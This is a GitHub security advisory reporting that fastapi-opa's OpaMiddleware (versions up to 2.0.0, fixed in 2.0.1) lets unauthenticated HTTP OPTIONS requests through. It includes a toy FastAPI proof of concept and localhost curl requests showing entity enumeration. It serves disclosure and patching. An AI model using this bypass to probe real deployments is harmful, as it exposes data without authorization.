# OpaMiddleware does not filter HTTP OPTIONS requests

Moderate

## Package

No package listed

## Affected versions

<= 2.0.0

## Patched versions

2.0.1

## Description

### Summary

HTTP `OPTIONS` requests are always allowed by `OpaMiddleware`, even when they lack authentication, and are passed through directly to the application.

I'm uncertain whether this should be classed as a "bug" or "security issue" â€“ but I'm erring on the side of "security issue" as an application could reasonably assume OPA controls apply to *all* HTTP methods, and it bypasses more sophisticated policies.

I'll leave it to you to make a call. ðŸ˜„

### Details

`OpaMiddleware` allows all HTTP `OPTIONS` requests without evaluating it against any policy:

[fastapi-opa/fastapi\_opa/opa/opa\_middleware.py](https://github.com/busykoala/fastapi-opa/blob/6dd6f8c87e908fe080784a74707f016f1422b58a/fastapi_opa/opa/opa_middleware.py#L79-L80)

Lines 79 to 80
in
[6dd6f8c](/busykoala/fastapi-opa/commit/6dd6f8c87e908fe080784a74707f016f1422b58a)

|  | if request.method == "OPTIONS": |
| --- | --- |
|  | return await self.app(scope, receive, send) |

If an application provides different responses to HTTP `OPTIONS` requests based on an entity existing (such as to indicate whether an entity is writable on a system level), an unauthenticated attacker could discover which entities exist within an application (CWE-204).

### PoC

This toy application is based on the behaviour of an app[1](#user-content-fn-1-1661f9ea9481a6e7145527c5254b8177) which can use `fastapi-opa`. The app uses the `Allow` header of a HTTP `OPTIONS` to indicate whether an entity is writable on a "system" level, and returns HTTP 404 for unknown entities:

```
# Run with: fastapi dev opa-poc.py --port 9999
from fastapi import FastAPI, Response, HTTPException
from fastapi_opa import OPAConfig, OPAMiddleware
from fastapi_opa.auth.auth_api_key import APIKeyAuthentication, APIKeyConfig

# OPA doesn't actually need to be running for this example
opa_host = "http://localhost:8181"
api_key_config = APIKeyConfig(
    header_key = 'ApiKey',
    api_key = 'secret-key',
)
api_key_auth = APIKeyAuthentication(api_key_config)
opa_config = OPAConfig(authentication=api_key_auth, opa_host=opa_host)

app = FastAPI()
app.add_middleware(OPAMiddleware, config=opa_config)

WRITABLE_ITEMS = {
    1: True,
    2: False,
}

@app.get("/")
async def root() -> dict:
    return {"msg": "success"}

@app.get("/items/{item_id}")
async def read_item(item_id: int):
    if item_id not in WRITABLE_ITEMS:
        raise HTTPException(status_code=404)
    return {"item_id": item_id}

@app.options("/items/{item_id}")
async def read_item_options(response: Response, item_id: int) -> dict:
    if item_id not in WRITABLE_ITEMS:
        raise HTTPException(status_code=404)

    response.headers["Allow"] = "OPTIONS, GET" + (", POST" if WRITABLE_ITEMS[item_id] else "")
    return {}
```

As expected, HTTP `GET` requests fail consistently when unauthenticated, regardless of whether the entity exists, because `read_item()` is never executed:

```
$ curl -i 'http://localhost:9999/items/1'
HTTP/1.1 401 Unauthorized
server: uvicorn
content-length: 26
content-type: application/json

{"message":"Unauthorized"}

$ curl -i 'http://localhost:9999/items/3'
HTTP/1.1 401 Unauthorized
server: uvicorn
content-length: 26
content-type: application/json

{"message":"Unauthorized"}

```

However, HTTP `OPTIONS` requests are never authenticated by `OpaMiddleware`, so are passed straight through to `read_item_options()` and returned to unauthenticated users:

```
$ curl -i -X OPTIONS 'http://localhost:9999/items/1'
HTTP/1.1 200 OK
server: uvicorn
content-length: 2
content-type: application/json
allow: OPTIONS, GET, POST

{}

$ curl -i -X OPTIONS 'http://localhost:9999/items/2'
HTTP/1.1 200 OK
server: uvicorn
content-length: 2
content-type: application/json
allow: OPTIONS, GET

{}

$ curl -i -X OPTIONS 'http://localhost:9999/items/3'
HTTP/1.1 404 Not Found
server: uvicorn
content-length: 22
content-type: application/json

{"detail":"Not Found"}

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
